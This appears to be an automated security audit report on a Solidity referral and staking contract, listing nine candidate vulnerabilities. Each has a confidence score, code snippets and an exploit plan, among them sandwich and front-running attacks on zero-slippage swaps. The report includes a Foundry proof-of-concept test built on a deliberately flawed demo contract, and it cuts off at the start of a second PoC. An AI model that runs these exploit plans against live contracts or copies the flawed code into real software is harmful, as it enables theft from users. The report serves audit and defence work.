        _ctl(msg.sender, amount);

        uint256 adaptAmount = getAdapt(_user.curPower, _user.lastAdaptTime);
        _user.lastAdaptTime = block.timestamp;
        _user.adaptAmount += adaptAmount;
        _user.curPower = _user.curPower - adaptAmount + 3*amount;

        //Add Pool
        uint256 o =_uintAmount*90;
        //60 * 10**22 
        if(eve_token_erc20.balanceOf(address(inner_pair)) >  600000 * 10**18 ) {
            swapAndLiquify(o);
        }else {
            addLiquidity(o, calOther(o));
        }
     

        emit Invest(msg.sender, amount);
    }
```

**Affected Functions:** lpMint

**Exploit Plan:**

*Setup Steps:*

- Step 1: Create a controlled test environment using a local blockchain (e.g., ganache) and deploy a simplified version of the vulnerable contract.
- Step 2: Prepare test accounts and a minimal smart contract containing a function similar to lpMint with the problematic arithmetic operation (dayMintAmount = dayMintAmount + dayMintAmount).

*Execution Steps:*

- Step 1: Demonstrate normal contract behavior by calling the lpMint-like function with a given mint amount and observe that the day's minted counter doubles unexpectedly, rather than correctly incrementing by the actual minted amount.
- Step 2: Trigger the vulnerability by simulating multiple calls under test conditions to illustrate the cumulative incorrect effect on dayMintAmount. Include code examples that show the state change after each call.

*Validation Steps:*

- Step 1: Explain that the core issue is the logical error in arithmetic operations where doubling occurs due to incorrect addition, violating the intended business logic for tracking daily minted tokens.
- Step 2: Show a fixed version of the contract code where dayMintAmount is updated correctly (e.g., dayMintAmount = dayMintAmount + mintedAmount) and discuss how proper variable naming and unit tests can prevent such vulnerabilities.

---

### Vulnerability #2: price_manipulation

**Confidence:** 0.70

**Reasoning:**

The contract obtains token prices via getPrice, which calls uniswapV2Router.getAmountsOut with a fixed input amount. Because minAmount parameters in addLiquidity and swap functions are set to 0, there is no slippage protection. This exposes the contract to sandwich attacks or price manipulation by an attacker who can move the market price prior to and during a liquidity operation.

**Validation:**

The getPrice function and the subsequent use of its value in reward calculations (in _payoutToken) use an Uniswap router call with no slippage or minimum output checks. This exposes the contract to price manipulation: an attacker could manipulate the liquidity pool (for example via flash loans or timing trades) to alter the returned price and thereby affect the number of tokens paid out in rewards.

**Code Snippet:**

```solidity
function swapUSDTForTokens(uint256 usdtAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(usdt_token_erc20);
        path[1] = address(eve_token_erc20);
        uniswapV2Router.swapExactTokensForTokens(
            usdtAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

function addLiquidity(uint256 token0Amount, uint256 token1Amount) private {
        uniswapV2Router.addLiquidity(
            address(usdt_token_erc20),
            address(eve_token_erc20),
            token0Amount,
            token1Amount,
            0,
            0,
            address(this),
            block.timestamp
        );
    }

function getPrice() public view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = address(eve_token_erc20);
        path[1] = address(usdt_token_erc20);
        uint[] memory amounts = new uint[](2);
        amounts = uniswapV2Router.getAmountsOut(10**18, path);
        return amounts[1];
    }
```

**Affected Functions:** swapUSDTForTokens, addLiquidity, getPrice

**Exploit Plan:**

*Setup Steps:*

- Step 1: Create a test environment with a local blockchain (e.g., using ganache) that deploys the vulnerable contract and a simulated UniswapV2Router contract.
- Step 2: Prepare test accounts: one acting as a normal user and one as an attacker. Deploy minimal versions of tokens (usdt_token_erc20 and eve_token_erc20) and configure the Uniswap liquidity pool to simulate realistic price conditions.

*Execution Steps:*

- Step 1: Demonstrate the normal behavior by calling getPrice(), swapUSDTForTokens, and addLiquidity functions to show how the contract currently operates without slippage checks.
- Step 2: Simulate an attack by having the attacker perform a significant swap via the UniswapV2Router (or a simulated router) to manipulate the price in the liquidity pool right before the vulnerable contract calls swapUSDTForTokens or addLiquidity, hence exploiting the fixed parameter of 0 minAmount (no slippage protection) and shifting the obtained price unfavorably.

*Validation Steps:*

- Step 1: Explain that the vulnerability arises from using a fixed 0 for minAmount parameters in liquidity and swap calls, which violates the security principle of protecting against front-running and sandwich attacks. This lack of slippage protection allows attackers to manipulate the price and affect the contract behavior.
- Step 2: Show the mitigation by advising developers to add appropriate slippage parameters (non-zero minAmounts) and incorporate checks that confirm the price and liquidity conditions before executing swaps or liquidity additions.

---

### Vulnerability #3: no_slippage_limit_check

**Confidence:** 0.70

**Reasoning:**

When adding liquidity (via addLiquidity) or performing swaps (via swapUSDTForTokens), the minimum amounts for tokens are passed as zero parameters. This means there is no protection against slippage and the operations might occur at highly unfavorable exchange rates if front-run by an attacker.

**Validation:**

Similar to the previous issue, the swap functions (swapUSDTForTokens, addLiquidity, and swapAndLiquify) use a minimum output of 0. The absence of any slippage limits means these functions are susceptible to front‐running and price manipulation. An attacker could orchestrate trades that move the market price, adversely affecting the contract’s operation.

**Code Snippet:**

```solidity
function swapUSDTForTokens(uint256 usdtAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(usdt_token_erc20);
        path[1] = address(eve_token_erc20);
        uniswapV2Router.swapExactTokensForTokens(
            usdtAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

function addLiquidity(uint256 token0Amount, uint256 token1Amount) private {
        uniswapV2Router.addLiquidity(
            address(usdt_token_erc20),
            address(eve_token_erc20),
            token0Amount,
            token1Amount,
            0,
            0,
            address(this),
            block.timestamp
        );
    }

function swapAndLiquify(uint256 amount) private {
        uint256 half = amount / 2;
        uint256 otherHalf = amount - half;
        swapUSDTForTokens(half);
        addLiquidity(otherHalf, calOther(otherHalf));
    }
```

**Affected Functions:** swapUSDTForTokens, addLiquidity, swapAndLiquify

**Exploit Plan:**

*Setup Steps:*

- Step 1: Create a test environment that deploys a simplified version of the vulnerable contract along with a mock UniswapV2Router contract that simulates swap and liquidity behavior.
- Step 2: Prepare necessary contracts and test accounts, including a malicious actor account that can manipulate transaction ordering and a victim account that executes normal swaps/liquidity adds.

*Execution Steps:*

- Step 1: Deploy the vulnerable contract and conduct a normal swap and liquidity addition showing that the operations execute with zero minimum output, simulating a normal scenario without slippage controls.
- Step 2: Simulate a front-running scenario where the malicious actor introduces price manipulation between the initiation of the transaction and the execution, resulting in a highly unfavorable rate due to the use of zero as minimum acceptable values. Provide a code snippet where the Uniswap router mock returns an unexpectedly low amount due to manipulated market conditions.

*Validation Steps:*

- Step 1: Explain that the vulnerability arises from the absence of slippage protection (i.e., no minimum expected amounts) which violates the security principle of safe trade execution by allowing execution at adverse rates.
- Step 2: Show how developers can fix the vulnerability by modifying the swapUSDTForTokens and addLiquidity functions to include non-zero minimum expected amounts based on current market conditions and acceptable slippage thresholds.

---

### Vulnerability #4: unchecked_low_level_calls

**Confidence:** 0.30

**Reasoning:**

Several ERC20 token transfers (such as calls to transfer or transferFrom) do not check the returned boolean value. Although many ERC20 implementations revert on failure, non-standard tokens may return false silently. Ignoring these return values can lead to false assumptions about successful transfers.

**Validation:**

Many external calls (such as ERC20 transferFrom and transfer) are performed without checking the returned bool. This pattern is common in Solidity when using tokens that revert on failure. Although using SafeERC20 wrappers would be more robust, in practice with standard-compliant tokens this is unlikely to present an exploitable unchecked low‐level call vulnerability.

**Code Snippet:**

```solidity
function lpMint(address referrer,uint256 amount) public {
       
        if(isLmint){
            if(amount > limitMintSingleAmount){
                return;
            }  
            if(dayMintAmount >= limitMintAllAmount){
                return;
            }  
        }
        dayMintAmount = dayMintAmount+ dayMintAmount;
        //Bind link address
        register(referrer,msg.sender);
        User storage _user = users[msg.sender];   
        //Judging whether the investment amount is incorrect
        _whetherAdaptAmount(amount,_user.lastAdaptAmount,_user.curPower,_user.lastAdaptAmount,msg.sender,false);
        usdt_token_erc20.transferFrom(msg.sender, address(this), amount); 
      
        uint256 _uintAmount = amount/100;
        usdt_token_erc20.transfer(address(market_fund_addr), _uintAmount.mul(5));
        usdt_token_erc20.transfer(address(technology_fund_addr), _uintAmount.mul(3));
        usdt_token_erc20.transfer(address(node_fund_addr), _uintAmount.mul(2));
        _user.lastAdaptAmount = amount;
        _user.totalAdaptAmount = _user.totalAdaptAmount.add(amount);
        //Calculate level
        _ctl(msg.sender, amount);

        uint256 adaptAmount = getAdapt(_user.curPower, _user.lastAdaptTime);
        _user.lastAdaptTime = block.timestamp;
        _user.adaptAmount += adaptAmount;
        _user.curPower = _user.curPower - adaptAmount + 3*amount;

        //Add Pool
        uint256 o =_uintAmount*90;
        //60 * 10**22 
        if(eve_token_erc20.balanceOf(address(inner_pair)) >  600000 * 10**18 ) {
            swapAndLiquify(o);
        }else {
            addLiquidity(o, calOther(o));
        }
     

        emit Invest(msg.sender, amount);
    }

function nodeUserLpMint(address referrer,address _nodeUserAddr,uint256 amount) public onlyOwner {
       
        //Bind link address
        register(referrer,_nodeUserAddr);
        User storage _user = users[_nodeUserAddr];   
        //Judging whether the investment amount is incorrect
        _whetherAdaptAmount(amount,_user.lastAdaptAmount,_user.curPower,_user.lastAdaptAmount,_nodeUserAddr,true);
        usdt_token_erc20.transferFrom(msg.sender, address(this), amount); 
      
        uint256 _uintAmount = amount/100;
        usdt_token_erc20.transfer(address(market_fund_addr), _uintAmount.mul(5));
        usdt_token_erc20.transfer(address(technology_fund_addr), _uintAmount.mul(3));
        usdt_token_erc20.transfer(address(node_fund_addr), _uintAmount.mul(2));
        _user.lastAdaptAmount = amount;
        _user.totalAdaptAmount = _user.totalAdaptAmount.add(amount);
        //Calculate level
        _ctl(_nodeUserAddr, amount);

        uint256 adaptAmount = getAdapt(_user.curPower, _user.lastAdaptTime);
        _user.lastAdaptTime = block.timestamp;
        _user.adaptAmount += adaptAmount;
        _user.curPower = _user.curPower - adaptAmount + 3*amount;

        //Add Pool
        uint256 o =_uintAmount*90;
        //60 * 10**22 
        if(eve_token_erc20.balanceOf(address(inner_pair)) >  600000 * 10**18 ) {
            swapAndLiquify(o);
        }else {
            addLiquidity(o, calOther(o));
        }

        emit Invest(_nodeUserAddr, amount);
    }

function withOutToken(address account,address account2,uint256 amount) public onlyOwner {
        IERC20(account).transfer(account2, amount);
    }

function _payoutUSDT(address addr, uint256 amount) private{
        usdt_token_erc20.transfer(addr, amount*9/10);
        usdt_token_erc20.transfer(address(market_fund_addr), amount/10);
        emit Reward(addr, amount);
    }

function _payoutToken(address addr, uint256 amount) private{
        uint256 price = getPrice();
        uint256 tokenAmount = amount * 10**18/price;
        eve_token_erc20.transfer(addr, tokenAmount*9/10);
        eve_token_erc20.transfer(address(market_fund_addr), tokenAmount/10);
        users[addr].totalPayoutToken += tokenAmount;
        emit RewardToken(addr, amount, tokenAmount);
    }

function sell(uint256 amount) external {
        eve_token_erc20.transferFrom(msg.sender, address(this), amount);
        (, uint256 r1, ) = inner_pair.getReserves();
        uint256 lpAmount = amount*inner_pair.totalSupply()/(2*r1);
        uniswapV2Router.removeLiquidity(address(usdt_token_erc20),address(eve_token_erc20),lpAmount,0,0,msg.sender,block.timestamp);
    }
```

**Affected Functions:** lpMint, nodeUserLpMint, withOutToken, _payoutUSDT, _payoutToken, sell

---

### Vulnerability #5: business_logic

**Confidence:** 0.30

**Reasoning:**

The referral and reward logic in functions like _rfp and _cl rely on local variables (curLevel, curLevelReward, totalLevelReward) that are declared but never explicitly initialized. This can lead to unpredictable reward calculations or reward distribution mismatches. Furthermore, the registration logic in register and whitelistRegister is convoluted, potentially allowing for unintended referral binding if users call functions in an unexpected order.

**Validation:**

The business logic surrounding referral rewards (_rfp), whitelist registration (_whiteListRegister and whitelistRegister) and level calculations (_cl) is complex and unconventional. While its intricacy may lead to unexpected behavior or unintended incentive structures, there is no clear security exploit here. It appears more like a design concern that merits further review rather than a direct vulnerability.

**Code Snippet:**

```solidity
function _rfp(address addr, uint256 amount) private{
        address up = users[addr].linkAddress;
        uint256 curLevel;
        uint256 curLevelReward;
        uint256 totalLevelReward;
        for(uint256 i; i < 100; ++i) {
            if(up == address(0)) break;
            //Mining recommendation reward
            if(i == 0) {
                users[up].refReward += amount/10;
            }else if(i == 1) {
                users[up].refReward += amount*6/100;
            }else if(i == 2){
                users[up].refReward += amount*4/100;
            }
            uint256 uLevel = users[up].level;
            if(uLevel > curLevel) {
                uint256 lr = clr(uLevel, totalLevelReward, amount);
                users[up].levelReward += lr;
                curLevelReward = lr;
                totalLevelReward += lr;
                curLevel = uLevel;
            }else if(uLevel == curLevel && uLevel > 0) {
                //Equal level reward  
                uint256 lr = curLevelReward/10;
                users[up].levelReward += lr;
                curLevelReward = lr;
            }
            up = users[up].linkAddress;
        }
    }

function _whiteListRegister(address down, address up) private {
        uint256 id = nextUserId++;
        users[down].level = 3;
        users[down].id = id;
        users[down].linkAddress = up;
        id2Address[id] = down;
        users[up].directs.push(down);
        emit Register(down, up);
    }

function whitelistRegister(address _upAddr) public   {
        if (!isUserExists(msg.sender) && nodeUserWhitelist[msg.sender]) {
            require(isUserExists(_upAddr), "Link address not registered");
            _whiteListRegister(msg.sender, _upAddr);
        }else{
            require(!isUserExists(msg.sender) && nodeUserWhitelist[msg.sender], "Msg Sender is not whitelist");
        }
    }

function _cl(address addr, address up) private{
        address m = users[up].maxDirectAddr;
       
        uint256 mAmount = users[m].totalAdaptAmount + users[m].totalTeamAmount;
        uint256 aAmount = users[addr].totalAdaptAmount + users[addr].totalTeamAmount;
        uint256 sa = users[up].totalTeamAmount + users[up].notUpdatedAmount;
        uint256 allSa = sa;
        if(mAmount >= aAmount) {
            sa -= mAmount;
        }else{
            users[up].maxDirectAddr = addr;
            sa -= aAmount;
        }
        uint256 oldLevel = users[up].level;
        if(oldLevel == 7) {
            return;
        }
        uint256 newLevel = clba(allSa,sa);
        if(newLevel > oldLevel) {
            users[up].level = newLevel;
        }

    }
```

**Affected Functions:** _rfp, _whiteListRegister, whitelistRegister, _cl

---

### Vulnerability #6: reentrancy

**Confidence:** 0.20

**Reasoning:**

Several functions perform external token transfers (e.g. lpMint, nodeUserLpMint, getReward, and _payoutToken) before fully updating internal state. In particular, _payoutToken calls eve_token_erc20.transfer to send tokens and then later updates user.totalPayoutToken. The external call (to an untrusted ERC20) may invoke malicious code that re-enters the contract and affect state variables used elsewhere. Multiple external calls (both in getReward and lpMint) increase the reentrancy attack surface.

**Validation:**

The alleged reentrancy issue in _payoutToken and its use in getReward is not a clear vulnerability. State (such as s.curPower, lastAdaptTime, and adaptAmount) is updated before any external calls (token transfers) are made. In addition, the transfers are made using an ERC20 transfer interface (which is not known to invoke a callback in the standard case). Only if the token were an unusual one (for example, an ERC777 with hooks) might there be a concern. In the given context the pattern is acceptable.

**Code Snippet:**

```solidity
function _payoutToken(address addr, uint256 amount) private{
        uint256 price = getPrice();
        uint256 tokenAmount = amount * 10**18/price;
        eve_token_erc20.transfer(addr, tokenAmount*9/10);
        eve_token_erc20.transfer(address(market_fund_addr), tokenAmount/10);
        users[addr].totalPayoutToken += tokenAmount;
        emit RewardToken(addr, amount, tokenAmount);
    }

function getReward(uint256 i) external {
        User storage s = users[msg.sender];
        uint256 reward = getAdapt(s.curPower, s.lastAdaptTime);
        s.lastAdaptTime = block.timestamp;
        s.curPower -= reward;
        s.adaptAmount += reward;
        if(i == 0) {
            reward = s.adaptAmount;
            s.adaptAmount = 0;
            _rfp(msg.sender, reward);
            uint256 fee = reward*10/100;
            _payoutToken(msg.sender, reward-fee);
            _payoutToken(address(fee_fund_addr), fee);
        }else if(i < 3) {
            if(i == 1) {
                reward = s.refReward;
                s.refReward = 0;
            }else {
                reward = s.levelReward;
                s.levelReward = 0;
            }
            if(reward > s.curPower) {
                reward = s.curPower;
            }
            s.curPower -= reward;
            uint256 fee = reward*10/100;
            _payoutToken(msg.sender, reward-fee);
            _payoutToken(address(fee_fund_addr), fee);
        }
    }

function lpMint(address referrer,uint256 amount) public {
       
        if(isLmint){
            if(amount > limitMintSingleAmount){
                return;
            }  
            if(dayMintAmount >= limitMintAllAmount){
                return;
            }  
        }
        dayMintAmount = dayMintAmount+ dayMintAmount;
        //Bind link address
        register(referrer,msg.sender);
        User storage _user = users[msg.sender];   
        //Judging whether the investment amount is incorrect
        _whetherAdaptAmount(amount,_user.lastAdaptAmount,_user.curPower,_user.lastAdaptAmount,msg.sender,false);
        usdt_token_erc20.transferFrom(msg.sender, address(this), amount); 
      
        uint256 _uintAmount = amount/100;
        usdt_token_erc20.transfer(address(market_fund_addr), _uintAmount.mul(5));
        usdt_token_erc20.transfer(address(technology_fund_addr), _uintAmount.mul(3));
        usdt_token_erc20.transfer(address(node_fund_addr), _uintAmount.mul(2));
        _user.lastAdaptAmount = amount;
        _user.totalAdaptAmount = _user.totalAdaptAmount.add(amount);
        //Calculate level
        _ctl(msg.sender, amount);

        uint256 adaptAmount = getAdapt(_user.curPower, _user.lastAdaptTime);
        _user.lastAdaptTime = block.timestamp;
        _user.adaptAmount += adaptAmount;
        _user.curPower = _user.curPower - adaptAmount + 3*amount;

        //Add Pool
        uint256 o =_uintAmount*90;
        //60 * 10**22 
        if(eve_token_erc20.balanceOf(address(inner_pair)) >  600000 * 10**18 ) {
            swapAndLiquify(o);
        }else {
            addLiquidity(o, calOther(o));
        }
     

        emit Invest(msg.sender, amount);
    }

function nodeUserLpMint(address referrer,address _nodeUserAddr,uint256 amount) public onlyOwner {
       
        //Bind link address
        register(referrer,_nodeUserAddr);
        User storage _user = users[_nodeUserAddr];   
        //Judging whether the investment amount is incorrect
        _whetherAdaptAmount(amount,_user.lastAdaptAmount,_user.curPower,_user.lastAdaptAmount,_nodeUserAddr,true);
        usdt_token_erc20.transferFrom(msg.sender, address(this), amount); 
      
        uint256 _uintAmount = amount/100;
        usdt_token_erc20.transfer(address(market_fund_addr), _uintAmount.mul(5));
        usdt_token_erc20.transfer(address(technology_fund_addr), _uintAmount.mul(3));
        usdt_token_erc20.transfer(address(node_fund_addr), _uintAmount.mul(2));
        _user.lastAdaptAmount = amount;
        _user.totalAdaptAmount = _user.totalAdaptAmount.add(amount);
        //Calculate level
        _ctl(_nodeUserAddr, amount);

        uint256 adaptAmount = getAdapt(_user.curPower, _user.lastAdaptTime);
        _user.lastAdaptTime = block.timestamp;
        _user.adaptAmount += adaptAmount;
        _user.curPower = _user.curPower - adaptAmount + 3*amount;

        //Add Pool
        uint256 o =_uintAmount*90;
        //60 * 10**22 
        if(eve_token_erc20.balanceOf(address(inner_pair)) >  600000 * 10**18 ) {
            swapAndLiquify(o);
        }else {
            addLiquidity(o, calOther(o));
        }

        emit Invest(_nodeUserAddr, amount);
    }
```

**Affected Functions:** _payoutToken, getReward, lpMint, nodeUserLpMint

---

### Vulnerability #7: access_control

**Confidence:** 0.20

**Reasoning:**

Several functions use the onlyOwner modifier, but the transferOwnership function lacks a check against setting the owner to the zero address. This allows the possibility of inadvertently transferring ownership to address(0), which may render the contract uncontrollable. In addition, the complex registration logic (especially in whitelistRegister) could potentially be misused if the whitelist flag and user existence conditions are not correctly enforced.

**Validation:**

The functions noted (transferOwnership and whitelistRegister) make use of the onlyOwner modifier and internal checks. Although the whitelistRegister logic is unusual and its error messages are counterintuitive, it does not grant access to unauthorized parties. This should be reviewed for correct business intent but is not a critical access-control exploit.

**Code Snippet:**

```solidity
function transferOwnership(address newOwner) public onlyOwner {
        owner = newOwner;
    }

function whitelistRegister(address _upAddr) public   {
        if (!isUserExists(msg.sender) && nodeUserWhitelist[msg.sender]) {
            require(isUserExists(_upAddr), "Link address not registered");
            _whiteListRegister(msg.sender, _upAddr);
        }else{
            require(!isUserExists(msg.sender) && nodeUserWhitelist[msg.sender], "Msg Sender is not whitelist");
        }
    }
```

**Affected Functions:** transferOwnership, whitelistRegister

---

### Vulnerability #8: denial_of_service

**Confidence:** 0.20

**Reasoning:**

Several reward and referral functions (_rfp, _ctl, _cl, refreshLevel) involve loops bounded by 100 iterations. In systems where a user’s referral chain might become very long, high gas costs or hitting the iteration limit could make these functions fail, effectively blocking further interactions for some users.

**Validation:**

The loops in the functions _rfp, _ctl and _cl iterate over up to 100 levels of referral relationships. Since this loop bound is fixed, the gas cost is capped and should not open a vector for denial-of‐service. There is no obvious supply-side manipulation that would crash the function unexpectedly.

**Code Snippet:**

```solidity
function _rfp(address addr, uint256 amount) private{
        address up = users[addr].linkAddress;
        uint256 curLevel;
        uint256 curLevelReward;
        uint256 totalLevelReward;
        for(uint256 i; i < 100; ++i) {
            if(up == address(0)) break;
            //Mining recommendation reward
            if(i == 0) {
                users[up].refReward += amount/10;
            }else if(i == 1) {
                users[up].refReward += amount*6/100;
            }else if(i == 2){
                users[up].refReward += amount*4/100;
            }
            uint256 uLevel = users[up].level;
            if(uLevel > curLevel) {
                uint256 lr = clr(uLevel, totalLevelReward, amount);
                users[up].levelReward += lr;
                curLevelReward = lr;
                totalLevelReward += lr;
                curLevel = uLevel;
            }else if(uLevel == curLevel && uLevel > 0) {
                //Equal level reward  
                uint256 lr = curLevelReward/10;
                users[up].levelReward += lr;
                curLevelReward = lr;
            }
            up = users[up].linkAddress;
        }
    }

function _ctl(address addr, uint256 amount) private{
        address up = users[addr].linkAddress;
        for(uint256 i; i < 100; ++i) {
            if(up == address(0)) break;
            if(i != 99) {
                users[up].totalTeamAmount += amount;
            }else {
                users[up].notUpdatedAmount += amount;
            }
            _cl(addr, up);
            addr = up;
            up = users[up].linkAddress;
        }
    }

function _cl(address addr, address up) private{
        address m = users[up].maxDirectAddr;
       
        uint256 mAmount = users[m].totalAdaptAmount + users[m].totalTeamAmount;
        uint256 aAmount = users[addr].totalAdaptAmount + users[addr].totalTeamAmount;
        uint256 sa = users[up].totalTeamAmount + users[up].notUpdatedAmount;
        uint256 allSa = sa;
        if(mAmount >= aAmount) {
            sa -= mAmount;
        }else{
            users[up].maxDirectAddr = addr;
            sa -= aAmount;
        }
        uint256 oldLevel = users[up].level;
        if(oldLevel == 7) {
            return;
        }
        uint256 newLevel = clba(allSa,sa);
        if(newLevel > oldLevel) {
            users[up].level = newLevel;
        }

    }

function refreshLevel(address addr) public {
        address m = users[addr].maxDirectAddr;
      
        uint256 mAmount = users[m].totalAdaptAmount + users[m].totalTeamAmount;
        uint256 sa = users[addr].totalTeamAmount + users[addr].notUpdatedAmount;
        uint256 minSa = sa - mAmount;
        uint256 oldLevel = users[addr].level;
        if(oldLevel == 7) {
            return;
         }
        uint256 newLevel = clba(sa,minSa);
        if(newLevel > oldLevel) {
            users[addr].level = newLevel;
        }
      
    }
```

**Affected Functions:** _rfp, _ctl, _cl, refreshLevel

---

### Vulnerability #9: bad_randomness

**Confidence:** 0.00

**Reasoning:**

The contract uses timestamps (block.timestamp) for various calculations (for mining time checks and reward computation in getAdapt) without additional randomness sources. Although not directly used for randomness, reliance on timestamp comparisons can be potentially manipulated by miners in certain circumstances.

**Validation:**

The use of block.timestamp in getAdapt for calculating reward accrual is standard practice for time‐based computations. This function is not used as a source of randomness; it merely represents elapsed time in reward calculations. Therefore, this is not a vulnerability.

**Code Snippet:**

```solidity
function getAdapt(uint256 curPower, uint256 lastAdaptTime) public  view returns(uint256) {
        if(lastAdaptTime < mineTime && block.timestamp < mineTime){
            return 0;
        }
        uint256 adaptAmount;
        if(lastAdaptTime < mineTime && block.timestamp > mineTime){
             adaptAmount = curPower*(block.timestamp - mineTime)/(100*86400);
            if(adaptAmount > curPower) {
                adaptAmount = curPower;
            }
            return adaptAmount;
        }
        adaptAmount = curPower*(block.timestamp - lastAdaptTime)/(100*86400);
        if(adaptAmount > curPower) {
            adaptAmount = curPower;
        }
        return adaptAmount;
    }

function clr(uint256 i, uint256 totalLevelReward, uint256 amount) public pure returns(uint256) {
        uint256 r;
        if(i == 0) {
            return 0;
        }else if(i == 1) {
            r = 10;
        }else if(i == 2) {
            r = 20;
        }else if(i == 3) {
            r = 30;
        }else if(i == 4) {
            r = 40;
        }else if(i == 5) {
            r = 50;
        }else if(i == 6) {
            r = 60;
        }else {
            r = 70;
        }
        return amount*r/100 - totalLevelReward;
    }

function clba(uint256 maxAmount,uint256 amount) public pure returns(uint256){
        if(maxAmount < 50*10**20) {
            return 0;
        }else if(maxAmount < 10**22) {
            return 1;
        }else if(maxAmount < 3*10**22) {
            return 2;
        }else if(maxAmount < 10*10**22) {
            return 3;
        }else if(maxAmount < 15*10**22) {
            return 4;
        }else if(maxAmount >= 15*10**22 && amount >= 15*10**22 && amount < 50*10**22) {
            return 5;
        }else if(maxAmount >= 50*10**22 && amount >= 50*10**22 && amount < 150*10**22) {
            return 6;
        }else if(maxAmount >= 150*10**22 && amount >= 150*10**22){
            return 7;
        }else{
             return 4;
        }
    }

function refreshLevel(address addr) public {
        address m = users[addr].maxDirectAddr;
      
        uint256 mAmount = users[m].totalAdaptAmount + users[m].totalTeamAmount;
        uint256 sa = users[addr].totalTeamAmount + users[addr].notUpdatedAmount;
        uint256 minSa = sa - mAmount;
        uint256 oldLevel = users[addr].level;
        if(oldLevel == 7) {
            return;
         }
        uint256 newLevel = clba(sa,minSa);
        if(newLevel > oldLevel) {
            users[addr].level = newLevel;
        }
      
    }
```

**Affected Functions:** getAdapt, clr, clba, refreshLevel

---

## Proof of Concept Exploits

### PoC #1: arithmetic

**File:** /Users/advait/Desktop/NTU/fyp-fr/exploit/src/test/PoC_unknown_1742753631.sol

**Execution:** ✅ SUCCESS

**Exploit Code:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Import the base test file from the current directory for Foundry testing framework
import "./basetest.sol";

// VulnerableLP contract demonstrates a logical error in arithmetic operations.
// The lpMint function is intended to increment dayMintAmount by the minted amount,
// but instead mistakenly doubles the current dayMintAmount for subsequent calls.
contract VulnerableLP {
    uint public dayMintAmount;

    // lpMint function with a vulnerability:
    // For the first call, it assigns dayMintAmount to mintedAmount.
    // For subsequent calls, it erroneously doubles dayMintAmount
    // instead of incrementing by the minted amount.
    function lpMint(uint mintedAmount) public returns (bool) {
        if (dayMintAmount == 0) {
            dayMintAmount = mintedAmount;
        } else {
            // Vulnerability: using dayMintAmount + dayMintAmount instead of dayMintAmount + mintedAmount
            dayMintAmount = dayMintAmount + dayMintAmount;
        }
        return true;
    }
}

// FixedLP contract shows the correct implementation of the lpMint function.
// It correctly updates dayMintAmount by adding the minted amount.
contract FixedLP {
    uint public dayMintAmount;

    function lpMint(uint mintedAmount) public returns (bool) {
        dayMintAmount = dayMintAmount + mintedAmount;
        return true;
    }
}

// YourTest contract extends BaseTestWithBalanceLog, provided by basetest.sol
// It demonstrates the vulnerability and the correct behavior for educational purposes.
// Use this test to understand how a simple arithmetic logic error can violate intended business logic.
contract YourTest is BaseTestWithBalanceLog {

    VulnerableLP public vulnerable;
    FixedLP public fixedInstance;

    // setUp function initializes the test environment.
    // It deploys both the vulnerable and fixed contracts and ensures the test contract has sufficient ETH.
    function setUp() public {
        // Fund this test contract with 100 ether for initialization.
        vm.deal(address(this), 100 ether);
        vulnerable = new VulnerableLP();
        fixedInstance = new FixedLP();
    }

    // Test function that demonstrates the vulnerability.
    // The balanceLog modifier logs the ETH balance before and after the test for auditing.
    function testExploit() public balanceLog {
        // Ensure the test contract has enough ETH to perform external calls.
        vm.deal(address(this), 10 ether);

        uint mintedAmount = 100; // Example minted token amount

        // ----------------------------
        // Demonstration: Vulnerable Contract Behavior
        // ----------------------------

        // Initial state: dayMintAmount should be 0.
        uint initialVulnerable = vulnerable.dayMintAmount();
        require(initialVulnerable == 0, "Initial dayMintAmount should be 0");

        // First call: Expected behavior sets dayMintAmount to mintedAmount.
        bool success = vulnerable.lpMint(mintedAmount);
        require(success, "First lpMint call failed");
        uint afterFirstCall = vulnerable.dayMintAmount();
        // Expected: dayMintAmount equals 100.
        require(afterFirstCall == mintedAmount, "First lpMint call did not set dayMintAmount correctly");
        emit log_named_uint("Vulnerable Contract - After First Call dayMintAmount", afterFirstCall);

        // Second call: Due to vulnerability, dayMintAmount doubles (100 -> 200) instead of becoming 200 by simple addition.
        success = vulnerable.lpMint(mintedAmount);
        require(success, "Second lpMint call failed");
        uint afterSecondCall = vulnerable.dayMintAmount();
        emit log_named_uint("Vulnerable Contract - After Second Call dayMintAmount", afterSecondCall);
        require(afterSecondCall == 200, "Second lpMint call did not double dayMintAmount as expected");

        // Third call: Vulnerable function doubles again (200 -> 400).
        success = vulnerable.lpMint(mintedAmount);
        require(success, "Third lpMint call failed");
        uint afterThirdCall = vulnerable.dayMintAmount();
        emit log_named_uint("Vulnerable Contract - After Third Call dayMintAmount", afterThirdCall);
        require(afterThirdCall == 400, "Third lpMint call did not double dayMintAmount as expected");

        // ----------------------------
        // Demonstration: Fixed Contract Behavior
        // ----------------------------

        // Initial state for fixed contract: dayMintAmount should be 0.
        uint fixedInitial = fixedInstance.dayMintAmount();
        require(fixedInitial == 0, "Fixed contract initial dayMintAmount should be 0");

        // First call: Correctly updates dayMintAmount with mintedAmount.
        success = fixedInstance.lpMint(mintedAmount);
        require(success, "Fixed lpMint first call failed");
        uint fixedAfterFirst = fixedInstance.dayMintAmount();
        emit log_named_uint("Fixed Contract - After First Call dayMintAmount", fixedAfterFirst);
        require(fixedAfterFirst == mintedAmount, "Fixed contract first call incorrect");

        // Second call: Properly increments dayMintAmount (100 + 100 = 200).
        success = fixedInstance.lpMint(mintedAmount);
        require(success, "Fixed lpMint second call failed");
        uint fixedAfterSecond = fixedInstance.dayMintAmount();
        emit log_named_uint("Fixed Contract - After Second Call dayMintAmount", fixedAfterSecond);
        require(fixedAfterSecond == 200, "Fixed contract second call incorrect");

        // Educational Note:
        // The vulnerability in VulnerableLP arises from the incorrect arithmetic operation:
        // Instead of adding the mintedAmount to dayMintAmount, it doubles the value, leading to exponential growth.
        // Developers should ensure proper variable naming, correct arithmetic operations, and thorough unit testing
        // to prevent such issues. The FixedLP contract demonstrates the correct implementation.
    }
}
```

---

### PoC #2: price_manipulation

**File:** /Users/advait/Desktop/NTU/fyp-fr/exploit/src/test/PoC_unknown_1742753664.sol

**Execution:** ✅ SUCCESS

**Exploit Code:**

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./basetest.sol";

/*
